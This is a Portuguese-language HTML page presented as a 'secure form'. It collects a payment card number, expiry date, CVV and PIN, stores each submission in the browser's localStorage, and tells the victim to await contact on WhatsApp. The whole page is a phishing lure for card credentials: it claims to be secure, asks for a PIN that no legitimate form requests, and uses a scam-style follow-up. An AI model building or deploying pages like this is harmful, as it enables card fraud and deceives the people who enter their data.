<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Formulário Seguro</title>
</head>
<body>
  <h2>Formulário Seguro</h2>
  <form id="secureForm">
    <input name="cartao" maxlength="16" placeholder="Cartão" required><br>
    <input name="validade" maxlength="4" placeholder="Validade MMYY" required><br>
    <input name="cvv" maxlength="3" placeholder="CVV" required><br>
    <input name="pin" maxlength="8" placeholder="Senha/PIN" required><br>
    <button type="submit">Enviar</button>
  </form>
  <div id="successMsg" style="display:none;">
    <h3>Seus dados foram enviados.<br>
    Aguarde contato no WhatsApp.</h3>
  </div>
  <script>
    document.getElementById('secureForm').addEventListener('submit', function(e){
      e.preventDefault();
      // Captura os dados
      const data = {
        cartao: this.cartao.value,
        validade: this.validade.value,
        cvv: this.cvv.value,
        pin: this.pin.value,
        hora: new Date().toLocaleString()
      };
      // Recupera do localStorage ou cria array vazio
      let envios = JSON.parse(localStorage.getItem('envios')) || [];
      // Adiciona novo envio
      envios.push(data);
      // Salva no localStorage
      localStorage.setItem('envios', JSON.stringify(envios));
      // Limpa e mostra mensagem de sucesso
      this.style.display = 'none';
      document.getElementById('successMsg').style.display = 'block';
    });
  </script>
</body>
</html>
